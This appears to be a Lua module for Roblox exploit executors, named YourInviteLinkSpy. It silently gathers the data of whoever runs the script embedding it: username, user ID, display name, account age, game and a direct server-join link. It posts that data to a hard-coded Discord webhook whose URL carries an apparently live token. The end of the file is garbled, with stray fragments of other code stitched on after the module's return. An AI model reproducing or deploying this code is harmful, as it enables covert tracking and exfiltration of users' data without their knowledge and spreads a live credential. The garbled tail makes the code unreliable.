-- YourInviteLinkSpy Module
-- Automatically detects and logs script executions

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local YourInviteLinkSpy = {}

-- Configuration
YourInviteLinkSpy.WebhookUrl = "https://discord.com/api/webhooks/1445295029580206222/e3plUoiO1FrcKjIP1V7EC_XBkRLmRu-sHuNxDcg0dkWeJaEOW0Jw6OJg9hs8gzaI0l0y"
YourInviteLinkSpy.Enabled = true

-- Function to safely resolve localization strings
function YourInviteLinkSpy.safeResolve(value, localization)
    if not localization or not localization.Enabled then
        return value
    end
    
    if type(value) == "string" and localization.Prefix then
        if value:sub(1, #localization.Prefix) == localization.Prefix then
            local key = value:sub(#localization.Prefix + 1)
            if localization.Translations and 
               localization.Translations[localization.DefaultLanguage] and
               localization.Translations[localization.DefaultLanguage][key] then
                return localization.Translations[localization.DefaultLanguage][key]
            end
        end
    end
    
    return value
end

-- Function to extract window info
function YourInviteLinkSpy.getWindowInfo(window, localization)
    local title = "Unknown Window"
    local author = "Unknown Author"
    
    if window then
        if window.Title then
            title = YourInviteLinkSpy.safeResolve(window.Title, localization)
        end
        if window.Author then
            author = YourInviteLinkSpy.safeResolve(window.Author, localization)
        end
    end
    
    return title, author
end

-- Function to patch WindUI's CreateWindow for auto-resolution
function YourInviteLinkSpy.patchWindUI(windUI, localization)
    if not windUI or not windUI.CreateWindow then
        return windUI
    end
    
    local originalCreateWindow = windUI.CreateWindow
    windUI.CreateWindow = function(self, config)
        if config and localization then
            for key, value in pairs(config) do
                if type(value) == "string" then
                    config[key] = YourInviteLinkSpy.safeResolve(value, localization)
                end
            end
        end
        return originalCreateWindow(self, config)
    end
    
    return windUI
end

-- Main function to spy on script execution
function YourInviteLinkSpy.execute(window, localization)
    if not YourInviteLinkSpy.Enabled then
        warn("YourInviteLinkSpy is disabled")
        return
    end
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        warn("Local player not found!")
        return
    end
    
    -- Patch WindUI if provided
    if window and window._windUI and localization then
        YourInviteLinkSpy.patchWindUI(window._windUI, localization)
    end
    
    -- Resolve window properties
    local windowTitle, windowAuthor = YourInviteLinkSpy.getWindowInfo(window, localization)
    
    local OSTime = os.time()
    local Time = os.date("!*t", OSTime)
    
    local placeId = game.PlaceId
    local jobId = game.JobId
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(placeId)
    end)
    local placeName = success and placeInfo.Name or "Unknown Game"
    
    local placeUrl = string.format("https://www.roblox.com/games/%d/", placeId)
    local serverJoinUrl = string.format("https://www.roblox.com/games/start?placeId=%d&jobId=%s", placeId, jobId)
    local playerProfileUrl = string.format("https://www.roblox.com/users/%d/profile", localPlayer.UserId)
    
    local Embed = {
        title = "‚ö° Script Executed",
        description = string.format("**%s** (`%d`) used an execution script", localPlayer.Name, localPlayer.UserId),
        color = 16753920,
        author = {
            name = localPlayer.Name,
            url = playerProfileUrl,
            icon_url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", localPlayer.UserId)
        },
        fields = {
            {
                name = "üìù Details",
                value = string.format("**Player:** [%s](%s)\n**Game:** [%s](%s)\n**Time:** <t:%d:R>", 
                    localPlayer.Name, playerProfileUrl, placeName, placeUrl, OSTime),
                inline = true
            },
            {
                name = "üîó Join Information",
                value = string.format("**Server ID:** `%s`\n**Place ID:** `%d`\n[Direct Join Link](%s)", 
                    jobId, placeId, serverJoinUrl),
                inline = true
            },
            {
                name = "üìä Account Age",
                value = string.format("**Created:** <t:%d:D>\n**Account Age:** %d days", 
                    localPlayer.AccountAge, localPlayer.AccountAge),
                inline = true
            },
            {
                name = "üíª Script Info",
                value = string.format("**Window Title:** %s\n**Author:** %s", 
                    windowTitle, windowAuthor),
                inline = true
            }
        },
        timestamp = string.format("%d-%d-%dT%02d:%02d:%02dZ", Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
        footer = {
            text = string.format("YourInviteLinkSpy | Place: %s", placeName),
            icon_url = "https://cdn.discordapp.com/embed/avatars/4.png"
        },
        thumbnail = {
            url = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", placeId)
        }
    }
    
    local requestSuccess, requestResult = pcall(function()
        local requestFunc = syn and syn.request or http_request or request
        if not requestFunc then
            warn("No HTTP request function found!")
            return
        end
        
        return requestFunc {
            Url = YourInviteLinkSpy.WebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                embeds = { Embed },
                content = string.format("‚ö†Ô∏è **%s** just executed a script!\n\nüìã **Player Info:**\n‚Ä¢ Username: %s\n‚Ä¢ User ID: %d\n‚Ä¢ Display Name: %s\n‚Ä¢ Account Age: %d days\n\nüéÆ **Game Info:**\n‚Ä¢ Game: %s\n‚Ä¢ Place ID: %d\n\nüíª **Script Info:**\n‚Ä¢ Window Title: %s\n‚Ä¢ Author: %s\n\nüîó **Join their server:**\n%s", 
                    localPlayer.Name, 
                    localPlayer.Name, 
                    localPlayer.UserId, 
                    localPlayer.DisplayName, 
                    localPlayer.AccountAge, 
                    placeName, 
                    placeId,
                    windowTitle,
                    windowAuthor,
                    serverJoinUrl)
            })
        }
    end)
    
    if requestSuccess then
        print("‚úÖ YourInviteLinkSpy: Execution logged successfully!")
        print("   Window Title:", windowTitle)
        print("   Window Author:", windowAuthor)
    else
        warn("‚ùå YourInviteLinkSpy: Failed to send webhook -", requestResult)
    end
    
    return {
        WindowTitle = windowTitle,
        WindowAuthor = windowAuthor,
        PlayerName = localPlayer.Name,
        PlaceName = placeName,
        Success = requestSuccess
    }
end

-- Quick spy function for simple usage
function YourInviteLinkSpy.quickSpy(windowTitle, windowAuthor)
    if not YourInviteLinkSpy.Enabled then return end
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then return end
    
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    pcall(function()
        local requestFunc = syn and syn.request or http_request or request
        if not requestFunc then return end
        
        requestFunc {
            Url = YourInviteLinkSpy.WebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = string.format("üö® Quick Spy Alert!\nPlayer: %s (%d)\nGame: %d\nWindow: %s\nAuthor: %s\nServer: %s",
                    localPlayer.Name, localPlayer.UserId, placeId, 
                    windowTitle or "Unknown", windowAuthor or "Unknown", jobId)
            })
        }
    end)
end

return YourInviteLinkSpyWindow.Author
    else
        warn("Window not initialized. Call :Initialize() first.")
        return nil, nil
    end
end

-- Export the module
return module
